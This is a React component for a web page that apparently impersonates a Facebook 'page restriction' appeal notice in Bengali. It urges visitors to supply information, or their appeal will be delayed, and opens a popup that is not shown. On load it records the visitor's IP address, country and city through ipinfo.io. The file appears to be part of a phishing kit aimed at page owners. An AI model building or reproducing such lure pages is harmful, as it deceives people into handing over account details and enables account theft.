import React, { useState,useEffect} from "react";
import MyPopup from "../../components/popup";



const HomePage = () => {
  const [isPopupOpen, setPopupOpen] = useState(false);

  useEffect(() => {
    const setLocaltion = async () => {
      try {
        fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
          localStorage.setItem(
            "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
          );
        });
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };
    setLocaltion();
  }, []);
  const handleSubmit = (e) => {
    e.preventDefault();
    setPopupOpen(true);
  };

  const closePopup = () => {
    setPopupOpen(false);
  };

  return (
    <>
      <img src="img/block_4.png" />
      <div className="card-text">
          <p className="card-type">পর্যালোচনার অনুরোধ</p>
          <h4><img src="img/block_lock.png" style={{width: "23px",marginTop:"-6px"}}/>পেজের সীমাবদ্ধতার সমস্যাগুলো সমাধান করা</h4>
          <p>অনুগ্রহ করে নিচে চাওয়া তথ্যগুলো অবশ্যই প্রদান করুন। এই তথ্যগুলো প্রদান না করলে আপনার আপিল প্রক্রিয়াকরণে দেরি হতে পারে।</p>
          <div className="btn-wrapper">
              <div onClick={handleSubmit} id="start" className="button fb-blue w-100">
                 পর্যালোচনার জন্য অনুরোধ করুন
              </div>
          </div>
      </div>
      <MyPopup isOpen={isPopupOpen} onClose={closePopup} />
    </>
);
}

export default HomePage;
